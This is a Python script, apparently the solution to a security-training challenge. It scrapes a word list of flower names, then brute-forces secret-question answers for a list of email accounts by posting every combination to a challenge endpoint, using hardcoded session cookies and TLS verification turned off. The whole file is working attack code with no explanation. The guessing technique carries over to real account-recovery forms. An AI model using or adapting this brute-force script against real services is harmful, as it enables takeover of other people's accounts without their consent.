from lxml import html
import requests


def get_flowers():
    page = requests.get('https://www.enchantedlearning.com/wordlist/flowers.shtml')
    tree = html.fromstring(page.content)
    return tree.xpath('//div[@class="wordlist-item"]/text()')


def send_flower_answer(email, flower):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }

    cookies = {
        'JSESSIONID': '5D6131C63389C8517025715CF915F785',
        'JSESSIONID3': '"FGDITjs+dL2y71uOrRHd2Q=="',
        'ac': 'ZG9Ob3RSZXR1cm5BbnN3ZXJz',
        'token': ' - 94559467076926645495339031240596426611',
    }

    data = {
        'subAnswer': flower,
        'subEmail': email,
    }

    response = requests.post(
        url='https://172.50.1.5:9443/challenges/269d55bc0e0ff635dcaeec8533085e5eae5d25e8646dcd4b05009353c9cf9c80SecretQuestion',
        data=data, headers=headers, cookies=cookies, verify=False)
    return response.text


def attack_questions(users, flowers):
    for user in users:
        for flower in flowers:
            print(f'Response: {send_flower_answer(user, flower)} \n User: {user} Flower: {flower}')


if __name__ == '__main__':

    users = [
        'zoidberg23@shepherd.com', 'zoidberg24@shepherd.com', 'elitehacker@shepherd.com', 'buzzthebald@shepherd.com',
        'spoiltbrat@security.com', 'superman4@security.com', 'superman3@security.com', 'superman2@security.com',
        'superman@security.com', 'superman6@security.com', 'superman7@security.com', 'superman8@security.com',
    ]

    flowers = get_flowers()

    attack_questions(users, flowers)